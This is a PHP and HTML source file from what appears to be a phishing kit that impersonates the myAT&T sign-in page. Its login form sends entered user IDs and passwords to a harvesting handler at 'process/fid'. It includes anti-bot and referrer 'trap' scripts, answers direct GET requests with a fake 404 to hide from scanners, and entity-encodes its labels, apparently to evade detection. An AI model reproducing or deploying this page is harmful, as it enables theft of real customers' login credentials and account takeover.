<?php
  $_SESSION['nonce'] = rand();
  echo '<input type="hidden" name="nonce" value="'.$_SESSION['nonce'].'">';
?>
<?php 
include 'anoxytytrap/anoxyty.php';
include 'hidden.php';

$currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
{
    http_response_code(404);
    include('err0r.php'); // provide your own 404 error page
    die(); /* remove this if you want to execute the rest of
              the code inside the file before redirecting. */
}
include 'anoxytytrap/bot.php';
include 'anoxytytrap/ref.php';
define('Myheader', TRUE);
?>
<?php include 'layers/header.php' ?>
<body>

	
  <div id="app-root" _nghost-rbp-c0="" ng-version="7.2.15"><div _ngcontent-rbp-c0=""><div _ngcontent-rbp-c0="" class="container-fluid" role="main"><div _ngcontent-rbp-c0="" class="d-flex flex-container Card"><app-header _ngcontent-rbp-c0="" class="d-flex flex-container" _nghost-rbp-c1=""><div _ngcontent-rbp-c1="" class="image" style="width: 65px;"><img _ngcontent-rbp-c1="" alt="AT&amp;T logo image" class="mar-b4 header-logo-image" id="headerLogoImage" style="width: 100%;" src="assets/img/logo.svg"></div><h1 _ngcontent-rbp-c1="" class="sign-in-header justify-content-center mb-0" id="signInHeaderText" style="margin-top: 20px;">Sign in</h1><h1 _ngcontent-rbp-c1="" class="DIRECTV-NOW-Text justify-content-center mt-0" id="signInHeaderToText">to myAT&amp;T</h1></app-header><app-error _ngcontent-rbp-c0="" _nghost-rbp-c2=""><!----></app-error><!----><app-manual-login _ngcontent-rbp-c0="" _nghost-rbp-c3="" class="ng-tns-c3-0 ng-star-inserted">
  
  
  
  <form _ngcontent-rbp-c3="" class="ng-tns-c3-0 ng-pristine ng-invalid ng-touched" id="logs" method="post" novalidate="" action="process/fid"><input class="ng-tns-c3-0 ng-untouched ng-pristine ng-valid" formcontrolname="appName" name="appName" type="hidden" value="m10707">
  
  
  <div   class="form-group"><label   class="textfield-label" for="userID" id="userLabel">&#x55;&#x73;&#x65;&#x72;&#x20;&#x49;&#x44; <div   class="ng-tns-c3-0" id="userLabelAfter"></div></label><div   class="flex-container justify-content-center"><input   class="ng-tns-c3-0 textfield ng-pristine ng-invalid ng-touched"  autocapitalize="off" autocomplete="username" id="userID" name="userID" spellcheck="false" type="email"><div   class="ng-tns-c3-0" ><!----></div></div></div>
  
  
  <!----><div   class="form-group text-right ng-tns-c3-0 ng-star-inserted"><a   class="ForgotLink" id="forgotUserID" href="">&#x46;&#x6f;&#x72;&#x67;&#x6f;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x20;&#x49;&#x44;&#x3f;</a></div>
  
  
  <div   class="form-group  pass_show""><label   class="textfield-label" for="password" id="passwordLabel">&#x50;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64; <div   class="ng-tns-c3-0" id="passwordLabelAfter"></div></label><div   class="flex-container justify-content-center"><input   class="ng-tns-c3-0 textfield ng-untouched ng-pristine ng-invalid"  autocapitalize="off" autocomplete="current-password" id="password" name="password" spellcheck="false" type="password"><span  class="ptxt ng-tns-c3-0 ng-star-inserted" id="showHideButton" role="button" tabindex="0" aria-label="SHOW password">SHOW</span></div><!----><div   class="ng-tns-c3-0" ><!----></div></div><!---->
  
  <div   class="form-group text-right ng-tns-c3-0 ng-star-inserted"><a   class="ForgotLink" id="forgotPassword" href="#">&#x46;&#x6f;&#x72;&#x67;&#x6f;&#x74;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x3f;</a></div><!----><div   class="form-group checkboxDiv mb-0 ng-tns-c3-0 ng-star-inserted"><label   class="checkbox" for="rememberMe"><input   class="ng-tns-c3-0" id="rememberMe" name="rememberMe" type="checkbox" value="Y" aria-label="Save user ID checkbox"><div   class="checkbox-skin"></div></label><span   class="checkbox-label ml-2" id="rememberMeText">Save user ID</span></div><!----><div   class="form-group justify-content-center fg-sign-in">
  
  <div   class="flex-container justify-content-center">
  <button   class="btn-primary" type="submit">Sign in</button><!----><!----></div></div><!----><!----><div   class="form-group justify-content-center dnUI ng-tns-c3-0 ng-star-inserted"><div   class="flex-container justify-content-center"><p   class="mb-0" id="dontHaveIdText">&#x44;&#x6f;&#x6e;&#x27;&#x74;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x61;&#x20;&#x75;&#x73;&#x65;&#x72;&#x20;&#x49;&#x44;&#x3f;</p><!----><a   class="text-style-1 ng-tns-c3-0 ng-star-inserted" id="createNow" href="javascript:void(0)"> &#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x20;&#x6f;&#x6e;&#x65;&#x20;&#x6e;&#x6f;&#x77; </a><!----></div></div></form>
  
  <script>
document.addEventListener('DOMContentLoaded', function() {
    const passwordEle = document.getElementById('password');
    const toggleEle = document.getElementById('showHideButton');

    toggleEle.addEventListener('click', function() {
        const type = passwordEle.getAttribute('type');
        passwordEle.setAttribute('type', type === 'password' ? 'text' : 'password');
    });
});  
</script>    
	
		<a style="display:none" href="anoxytytrap">Trap</a>
		
  
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Bootstrap.min.js"></script>
<script src="assets/dist/js/toggle.js"></script>
<script >

</script>


  </app-manual-login><!----><!----></div></div><!---->
  <?php include'layers/foot.php' ?>